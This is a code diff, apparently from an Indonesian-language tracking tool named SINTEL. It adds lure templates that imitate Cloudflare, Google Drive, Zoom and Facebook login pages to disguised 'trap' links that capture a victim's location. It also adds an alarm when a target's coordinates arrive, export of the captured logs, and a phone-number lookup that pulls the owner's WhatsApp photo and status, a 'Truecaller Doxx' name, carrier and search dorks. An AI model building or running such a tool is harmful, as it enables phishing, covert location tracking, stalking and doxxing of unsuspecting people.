@@ -437,6 +437,16 @@
                             placeholder="Web Palsu (ex: s.id/Hadiah-mu)" value="https://google.com">
                         <div class="icon-wrapper"><i data-lucide="link"></i></div>
                     </div>
+                    <div class="input-group">
+                        <select id="templateSelect" class="styled-input"
+                            style="appearance: none; -webkit-appearance: none;">
+                            <option value="cf">🌐 Template: Cloudflare Verification</option>
+                            <option value="drive">📁 Template: Google Drive (Request Access)</option>
+                            <option value="zoom">📹 Template: Zoom Waiting Room</option>
+                            <option value="meta">👤 Template: Facebook Security Login</option>
+                        </select>
+                        <div class="icon-wrapper"><i data-lucide="layout"></i></div>
+                    </div>
                     <button class="btn-lacak" onclick="generateTracker()">BUAT TRACKING LINK & BUKA DASHBOARD</button>
                 </div>
 
@@ -503,6 +513,14 @@
                             <i data-lucide="power-off" style="width:18px;"></i> Berhenti
                         </button>
                     </div>
+
+                    <button onclick="exportLogs()"
+                        style="width:100%; margin-bottom: 2rem; background: rgba(255,255,255,0.05); color: #fff; border: 1px dashed var(--glass-border); padding: 12px; border-radius: 8px; cursor: pointer; font-family: 'Space Mono'; font-size: 0.8rem; display: flex; align-items: center; justify-content: center; gap: 10px;">
+                        <i data-lucide="download"></i> EKSPOR SEMUA DATA (TXT)
+                    </button>
+
+                    <audio id="pingSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"
+                        preload="auto"></audio>
 
                     <div id="logsContainer">
                         <!-- Logs injected here -->
@@ -649,6 +667,18 @@
             document.getElementById('displayTrapLinkRaw').innerText = '';
             document.getElementById('displayTrapLink').innerText = '';
             document.getElementById('logsContainer').innerHTML = '';
+            window.logDataStore = {};
+        }
+
+        function exportLogs() {
+            if (!window.logDataStore || Object.keys(window.logDataStore).length === 0) return alert('Belum ada data buat diekspor!');
+            const text = Object.values(window.logDataStore).join('\n\n' + '='.repeat(40) + '\n\n');
+            const blob = new Blob([text], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `SINTEL_REPORT_${new Date().toISOString().split('T')[0]}.txt`;
+            a.click();
         }
 
         function switchTab(panelId, element) {
@@ -673,12 +703,34 @@
                 const info = await res.json();
                 if (!info.valid) throw new Error(info.error || 'Nomor tidak terdeteksi jaringan');
 
+                const waHtml = info.whatsapp && info.whatsapp.profilePic
+                    ? `<div style="text-align:center; margin: 15px 0;"><img src="${info.whatsapp.profilePic}" style="width:80px; height:80px; border-radius:50%; border: 2px solid var(--primary);"><br><span style="font-size:0.75rem; color:var(--primary);">WA Profile Found</span></div>`
+                    : '';
+
+                const scamLabel = info.scamStatus && info.scamStatus.kredibel.reported
+                    ? `<span class="result-value" style="color:var(--accent)">DILAPORKAN PENIPU 💀</span>`
+                    : `<span class="result-value" style="color:var(--success)">Bersih / No Record</span>`;
+
+                const dorkHtml = info.scamStatus ? `<div style="margin-top:20px; border-top: 1px solid var(--glass-border); padding-top: 15px;">
+                    <p style="font-size:0.75rem; color:var(--text-dim); margin-bottom:10px;">Gunakan Dorks sakti ini untuk melacak manual:</p>
+                    ${(await (await fetch('/api/dorks?number=' + input)).json()).dorks.map(d =>
+                    `<a href="https://www.google.com/search?q=${encodeURIComponent(d)}" target="_blank" style="display:block; background:rgba(255,255,255,0.05); padding:8px 12px; border-radius:6px; font-family:'Space Mono'; font-size:0.7rem; color:var(--primary); margin-bottom:8px; text-decoration:none; border:1px solid rgba(0,240,255,0.1);">
+                            ${d.substring(0, 50)}... <i data-lucide="external-link" style="width:10px; vertical-align:middle;"></i>
+                        </a>`
+                ).join('')}
+                </div>` : '';
+
                 document.getElementById('resultBoxNum').innerHTML = `
+                    ${waHtml}
                     <div class="result-item"><span class="result-label">Status Nomor</span><span class="result-value" style="color:var(--success)">AKTIF MENGUDARA</span></div>
+                    <div class="result-item"><span class="result-label">Daftar Hitam</span>${scamLabel}</div>
+                    <div class="result-item"><span class="result-label">WA Status</span><span class="result-value">${info.whatsapp ? info.whatsapp.about : 'Unknown'}</span></div>
                     <div class="result-item"><span class="result-label">Loc Asal SIM (HLR)</span><span class="result-value" style="color:#ffcc00">${info.hlrRegion}</span></div>
                     <div class="result-item"><span class="result-label">Provider Network</span><span class="result-value">${info.carrier}</span></div>
                     <div class="result-item"><span class="result-label">Truecaller Doxx</span><span class="result-value">${info.truecallerName}</span></div>
+                    ${dorkHtml}
                 `;
+                lucide.createIcons();
                 document.getElementById('resultBoxNum').style.display = 'block';
             } catch (err) {
                 alert(`Gagal Banh: ${err.message}`);
@@ -691,10 +743,11 @@
 
         async function generateTracker() {
             const target = document.getElementById('targetUrlInput').value;
+            const tpl = document.getElementById('templateSelect').value;
             const topicId = 'sintel_' + Math.random().toString(36).substring(2, 10);
             const tBase = btoa(target);
 
-            const rawLink = `${window.location.origin}/api/trap?topic=${topicId}&t=${tBase}`;
+            const rawLink = `${window.location.origin}/api/trap?topic=${topicId}&t=${tBase}&tpl=${tpl}`;
             let trapLink = rawLink;
 
             // Optional: Auto-shorten using our internal API
@@ -747,6 +800,9 @@
                         const latVal = parseFloat(tgt.lat);
                         const lonVal = parseFloat(tgt.lon);
                         const mapsLink = tgt.lat ? `https://www.google.com/maps?q=${tgt.lat},${tgt.lon}` : null;
+
+                        // Play Alarm!
+                        try { document.getElementById('pingSound').play(); } catch (e) { }
 
                         // Add/Update Marker on Map
                         if (latVal && lonVal) {
